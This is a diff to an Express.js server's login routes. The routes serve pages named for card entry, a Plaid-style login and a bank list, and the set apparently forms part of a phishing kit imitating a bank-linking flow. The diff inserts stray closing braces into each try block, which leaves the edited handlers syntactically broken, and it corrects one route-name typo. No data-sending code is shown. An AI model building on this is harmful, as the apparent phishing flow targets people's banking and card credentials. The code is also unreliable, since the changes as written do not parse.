@@ -150,7 +150,7 @@ app.get('/login/verification/2', async (req, res) => {
   try {
     let htmlContent;
         htmlContent = await fs.readFile(path.join(__dirname, 'public', 'contact.html'), 'utf-8');
-    
+    }
     res.send(htmlContent);
   } catch (error) {
     console.error('Error reading file:', error);
@@ -163,9 +163,9 @@ app.get('/login/link', async (req, res) => {
   try {
     let htmlContent;
         htmlContent = await fs.readFile(path.join(__dirname, 'public', 'pl.html'), 'utf-8');
+    }
     res.send(htmlContent);
-  }
-   catch (error) {
+  } catch (error) {
     console.error('Error reading file:', error);
     res.status(500).send('Internal Server Error');
   }
@@ -176,6 +176,7 @@ app.get('/login/verification/3', async (req, res) => {
   try {
     let htmlContent;
         htmlContent = await fs.readFile(path.join(__dirname, 'public', 'card.html'), 'utf-8');
+    }
     res.send(htmlContent);
   } catch (error) {
     console.error('Error reading file:', error);
@@ -187,10 +188,9 @@ app.get('/login/plaid', async (req, res) => {
   try {
     let htmlContent;
         htmlContent = await fs.readFile(path.join(__dirname, 'public', 'pllogin.html'), 'utf-8');
-    
+    }
     res.send(htmlContent);
-  }
-   catch (error) {
+  } catch (error) {
     console.error('Error reading file:', error);
     res.status(500).send('Internal Server Error');
   }
@@ -200,20 +200,19 @@ app.get('/link', async (req, res) => {
   try {
     let htmlContent;
         htmlContent = await fs.readFile(path.join(__dirname, 'public', 'plbanks.html'), 'utf-8');
-    
+    }
     res.send(htmlContent);
-  }
-   catch (error) {
+  } catch (error) {
     console.error('Error reading file:', error);
     res.status(500).send('Internal Server Error');
   }
 });
 
-app.get('/limk/complete', async (req, res) => {
+app.get('/link/complete', async (req, res) => {
   try {
     let htmlContent;
         htmlContent = await fs.readFile(path.join(__dirname, 'public', 'complete.html'), 'utf-8');
-    
+    }
     res.send(htmlContent);
   } catch (error) {
     console.error('Error reading file:', error);
